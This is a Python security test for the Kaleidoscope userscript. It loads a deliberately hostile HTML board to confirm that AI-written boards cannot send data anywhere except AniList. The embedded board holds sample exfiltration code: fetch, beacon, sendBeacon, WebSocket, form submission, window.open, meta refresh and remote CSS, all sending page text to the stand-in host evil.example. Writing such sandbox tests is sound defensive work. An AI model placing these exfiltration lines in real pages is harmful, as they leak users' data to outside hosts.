"""Check that a Kaleidoscope board can't send anything anywhere.

    python3 tools/boardtest.py

A board is a page an AI wrote, so Kaleidoscope treats it as untrusted code (CLAUDE.md, Security). This
opens a made-up hostile board in desktop Kaleidoscope that tries every way out it can: fetch, an image
beacon, sendBeacon, a WebSocket, a stylesheet and a CSS background from another site, a form that submits
itself, window.open, a link, navigating its own frame, a meta refresh, and WebRTC. It passes when none of
those reach evil.example, while the things a real board needs still work: AniList's API, AniList's cover
images, and "Open on AniList" (opened by Kaleidoscope, AniList addresses only). Prints "clean" or the
problems.
"""
import json, os, subprocess, sys, tempfile
HERE = os.path.dirname(os.path.abspath(__file__)); R = os.path.dirname(HERE)
sys.path.insert(0, HERE)
from screens import CLOCK

EVIL = 'evil.example'
BOARD = r'''<!DOCTYPE html><html><head><meta charset="utf-8"><title>Hostile board</title>
<link rel="stylesheet" href="https://evil.example/style.css">
<style>body{background:url(https://evil.example/bg.png)}</style>
<meta http-equiv="refresh" content="1;url=https://evil.example/meta-refresh">
</head><body>
<h1>Recommendations</h1>
<img src="https://s4.anilist.co/file/anilistcdn/media/anime/cover/large/bx1.jpg" alt="">
<img src="https://evil.example/pixel.gif" alt="">
<a id="ok" href="https://anilist.co/anime/1">Open on AniList</a>
<a id="bad" href="https://evil.example/link?d=secret">Somewhere else</a>
<form id="f" action="https://evil.example/form" method="post"><input name="d" value="secret"></form>
<script>
  var data = document.body.innerText;
  try { fetch('https://evil.example/fetch?d=' + encodeURIComponent(data)); } catch (e) {}
  try { new Image().src = 'https://evil.example/beacon?d=1'; } catch (e) {}
  try { navigator.sendBeacon('https://evil.example/sendbeacon', data); } catch (e) {}
  try { new WebSocket('wss://evil.example/ws'); } catch (e) {}
  try { document.getElementById('f').submit(); } catch (e) {}
  try { window.open('https://evil.example/window-open?d=1'); } catch (e) {}
  try { window.open('https://anilist.co/anime/2'); } catch (e) {}
  document.getElementById('ok').click();
  document.getElementById('bad').click();
  // what a real board does: ask AniList for a cover, and report whether WebRTC is reachable
  fetch('https://graphql.anilist.co', { method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ query: '{ Media(id: 1) { id } }', webrtc: typeof RTCPeerConnection }) }).catch(function () {});
  setTimeout(function () { try { location.href = 'https://evil.example/navigate'; } catch (e) {} }, 600);
</script></body></html>'''

def run(script=f'{R}/desktop/kaleidoscope/kaleidoscope.user.js'):
    store = {'kaleidoscope.boards': [{'id': 'hostile', 'html': BOARD, 'type': 'ANIME', 'user': 'JigglyPug', 'ts': 1762220400000, 'label': 'Test'}]}
    seed = tempfile.NamedTemporaryFile('w', suffix='.json', delete=False); json.dump(store, seed); seed.close()
    js = "(async () => { await new Promise(r => setTimeout(r, 2500)); return { opened: window.__opened || [] }; })()"
    r = subprocess.run(['node', f'{HERE}/shot.js', script, 'https://anilist.co/home#kaleidoscope-board=hostile',
                        '/dev/null', '--clock', CLOCK, '--seed', seed.name, '--requests', '--commit', '--eval', js, '--print'], capture_output=True, text=True, timeout=180)
    os.unlink(seed.name)
    reqs = [l[4:] for l in r.stdout.splitlines() if l.startswith('REQ ')]
    ev = next((l for l in r.stdout.splitlines() if l.startswith('EVAL ')), None)
    if not ev: return [f'could not run: {(r.stderr or r.stdout)[-300:]}']
    opened = (json.loads(ev[5:]) or {}).get('opened', [])
    bad = [f'got out: {q}' for q in reqs if EVIL in q]
    bad += [f'opened a tab outside AniList: {u}' for u in opened if EVIL in u]
    if not any('graphql.anilist.co' in q for q in reqs): bad.append("the board couldn't reach AniList's API (covers would break)")
    if not any('s4.anilist.co' in q for q in reqs): bad.append("the board couldn't load AniList's cover images")
    if not any(u.startswith('https://anilist.co/anime/1') for u in opened): bad.append('"Open on AniList" links no longer open')
    if not any(u.startswith('https://anilist.co/anime/2') for u in opened): bad.append("window.open() to AniList no longer opens")
    if any('"webrtc":"function"' in q for q in reqs): bad.append('WebRTC is still reachable inside the board')
    return bad

if __name__ == '__main__':
    bad = run(*sys.argv[1:2])   # optional: another copy of the script (say, the live one, to see what it let out)
    print('== kaleidoscope board: ' + ('clean' if not bad else f'{len(bad)} problem' + 's' * (len(bad) > 1)))
    for b in bad: print('  ' + b)
